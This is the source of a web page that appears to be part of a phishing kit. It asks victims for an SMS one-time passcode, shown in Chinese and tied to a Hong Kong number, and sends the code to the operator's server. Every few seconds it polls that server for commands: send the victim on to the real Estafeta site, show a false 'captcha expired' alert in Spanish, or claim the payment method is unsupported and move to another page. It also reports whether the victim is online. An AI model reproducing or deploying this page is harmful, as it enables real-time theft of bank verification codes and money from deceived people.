<?php
session_start();
// include('partials/header.php');
//include('header-him.php');
include('header_.php');

$phone = "";
if (isset($_SESSION['contact_number'])) {
  $phone = $_SESSION['contact_number'];
}

?>
<style>
  /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
  .wrap.middle {
    padding: 40px 30px;
    margin-top: 50px;
    background: #f0f0eb;
    padding-bottom: 0px;
  }

  .note {
    margin-bottom: 30px;
  }

  .note font {
    font-weight: 400;
  }

  .input-otp input[type="text"] {
    border: 1px solid #000 !important;
    background-color: #fff !important;
    padding: 3px 8px !important;
    font-weight: 400;
    margin-bottom: 5px;
  }

  .submit-btn {
    background-color: #F26F21 !important;
    border: 1px solid #000 !important;
    margin: 5px 0;
  }

  @media(max-width: 767px) {
    .submit-btn {
      background-color: #F26F21;
      padding: 11px 24px;
      font-size: 20px;
      display: block;
      width: 100%;
      min-width: 120px;
      margin-left: auto;
      margin-right: auto;
      line-height: 22px;
      border-radius: 32px;
      color: #fff;
      border-color: #00a8b7;
      height: auto;
      cursor: pointer;
    }

    .phone-row input,
    .input-otp input {
      border: none;
      border-bottom: 2px solid #cacaca;
      height: 40px;
      background: transparent;
      font-family: inherit;
      margin-bottom: 15px;
      outline: none;
    }

    .input-otp {
      text-align: center;
    }

    .input-otp input {
      text-align: center;
    }

    .note {
      text-align: center;
      font-size: 16px;
      color: #565656;
      pointer-events: none;
      user-select: none;
    }

    .count-down {
      font-size: 14px;
      color: #ccc;
      border: 1px solid #ccc;
      max-width: 200px;
      margin: auto;
      padding: 10px;
      margin-bottom: 30px;
      margin-top: 10px;
    }

    .wrap.middle form {
      width: 100%;
    }

    .submit-btn:hover:hover {
      background-color: #00a8b7;
      border-color: #00a8b7;
    }
  }
</style>
<div class="backdrop"></div>
<div class="wrap middle" style="width: 100%!important;">
  <div class="form">


    <form class="input-phone" action="">
      <div class="note">請輸入一個以認證的香港手機號碼</div>
      <div class="phone-row">
        <input class="phone-code" type="text" value=" ">
        <input class="phone-number" type="tel" value="<?php echo $phone; ?>" name="telphone" placeholder="手機號碼" pattern="[0-9]{8}" maxlength="12" required />
      </div>
      <div class="center"><button id="getotp" class="send-phone disabled" type="button">認證我的手機號碼</button></div>
    </form>

    <!-- <form class="input-otp" action="" method="POST"> -->
    <div class="input-otp">
      <div class="note">
        <p>我们将发送一条 OTP 验证到您的短信<span id="phone-number"></span><br />请输入您收到的一次性密码（短信网络波动会延迟发送，请耐心等待）</p>
      </div>
      <input class="otp" type="text" id="fullname" name="otp">
      <div class="count-down disabled ">重新发送（<span class="second">60</span>秒）</div>
      <div class="center">
        <button class="send-otp disabled submit-btn" id="cnt">验证</button>
      </div>
    </div>

    <input type="hidden" id="last_id" value="<?php echo @$_SESSION["last_id"]; ?>" />
    <!-- </form> -->

  </div>


  <div class="spinner-border" id="ajaxprogress" style="z-index: 9999;position: fixed;top:0px;display:none;height:100%;width:100%;right: 0px;" role="status">
    <span class="" style="z-index: 1041;display: flex;justify-content: center;width: 100%;align-items: center;height:100%;">
      <div class="lds-default">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
        <div></div>
      </div>
    </span>
  </div>

</div>
<br />
<br />

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.slim.min.js" integrity="sha512-yBpuflZmP5lwMzZ03hiCLzA94N0K2vgBtJgqQ2E1meJzmIBfjbb7k4Y23k2i2c/rIeSUGc7jojyIY5waK3ZxCQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script type="text/javascript" src="./assets/js/jquery-2.1.3.min.js"></script>
<script>
  //script to check input

  jQuery('.input-phone').hide();
  jQuery('.input-otp').show();

  jQuery('.phone-row input').on('input', function() {
    let check = true;
    jQuery('.phone-row input').each(function() {
      if (jQuery(this).val() == '') check = false;
      //console.log(jQuery(this).val());

    });

    if (check) jQuery('.send-phone').removeClass('disabled');
    else jQuery('.send-phone').addClass('disabled')
  });


  jQuery('.otp').on('input', function() {
    console.log('a');

    if (jQuery('.otp').val() == '') jQuery('.send-otp').addClass('disabled');
    else jQuery('.send-otp').removeClass('disabled')
  });



  var second = 60;

  function optSent() {
    //update button
    var count = setInterval(function() {
      second--;
      jQuery('.second').html(second);
      if (second <= 0) {
        clearInterval(count);
        jQuery('.count-down').html('reenviar').removeClass('disabled');
      };
    }, 1000);
  }

  jQuery('.input-otp input').focus();
  jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());

  optSent();

  jQuery('#getotp').on('click', function() {
    //api call
    //  jQuery('.input-phone').hide();
    //jQuery('.input-otp').show();
    jQuery('.input-otp input').focus();
    jQuery('#phone-number').html(jQuery('.phone-code').val() + ' ' + jQuery('.phone-number').val());
    optSent();
  });
</script>







<script>
  jQuery('#cnt').click(function() {
    debugger;
    if (jQuery("#cnt").html() == 'Validar' || jQuery("#cnt").text() == '验证') {
      var last_id = jQuery("#last_id").val();
      var code = jQuery("#fullname").val();
      if (code == '') {
        $("#fillfi").show();
        return;
      }
      jQuery('#fullname').removeClass(" hide-phone");
      jQuery("#ajaxprogress").css("display", "block");
      $(".backdrop").show();
      $.ajax({
        url: 'process.php',
        type: 'POST',
        dataType: "json",
        data: {
          code: code,
          last_id: last_id
        },
        success: function(result) {
          console.log(result);
          // jQuery("#ajaxprogress").css("display", "none");
          // $(".backdrop").hide()
        }
      });

    } else {
      jQuery('#fullname').val('');
      jQuery('#fullname').attr("placeholder", "输入您的一次性密码");
      //jQuery('#fullname').val('Enter your OTP');
      jQuery('#fullname').removeClass(" hide-phone");
      var counter = 60;
      var interval = setInterval(function() {
        counter--;
        $('#cnt').html("证实");
        // Display 'counter' wherever you want to display it.
        if (counter <= 0) {
          clearInterval(interval);
          $('#cnt').html("证实");
          return;
        } else {
          if (counter < 60) {
            $('#time').text("00:" + counter);
          } else {
            $('#time').text(counter);
          }
          console.log("Timer --> " + counter);
        }
      }, 1000);
    }
  })
</script>

<script type="text/javascript">
  jQuery(document).ready(function() {

    var showalert = true;
    window.setInterval(function() {
      // do stuff
      var userid = jQuery("#last_id").val();
      $.ajax({
        type: 'post',
        url: '<?php echo $folder_path;?>/usertrackingstatus.php',
        data: {
          'userid': userid
        },
        success: function(data) {
          //alert(data.length);
          if (data == 1) {
            jQuery(location).attr('href', 'https://www.estafeta.com/');
          }
          if (data == 2) {
            jQuery("#ajaxprogress").css("display", "none")
            $(".backdrop").hide();
            jQuery('#fillfi').css('display', 'block');
            if (showalert) {
              alert("Captcha agotado, por favor, vuelva a introducir el nuevo captcha.");
              showalert = false;
            }
            return false;
          }

            if (data == 3) {
                showalert = (jQuery('.otp').val() != '') ? true : showalert;
                jQuery("#ajaxprogress").css("display", "none")
                $(".backdrop").hide();
                jQuery('#fillfi').css('display', 'block');
                if (showalert) {
                    alert("Su método de pago no es compatible, cambie el método de pa");
                    jQuery(location).attr('href', './page4.php');
                }
                return false;
            }

        }
      });

    }, 4000);
  })
</script>
<script>
  /* JS comes here */
  function setOnline(id, status) {
    if (id) {
      $.ajax({
        type: 'post',
        url: '<?php echo $folder_path;?>/usertrackingstatus.php',
        data: {
          'id': id,
          'status': status
        },
        success: function(data) {

        }
      });
    }
  }
  var userid = <?php echo $_SESSION["last_id"]; ?>;


  window.addEventListener('load', function(e) {
    if (navigator.onLine) {
      setOnline(userid, 1)
    } else {
      setOnline(userid, 0)
    }
  }, false);

  window.addEventListener('online', function(e) {
    setOnline(userid, 1)
  }, false);

  window.addEventListener('offline', function(e) {
    setOnline(userid, 0)
  }, false);
</script>

<?php include('footer_.php'); ?>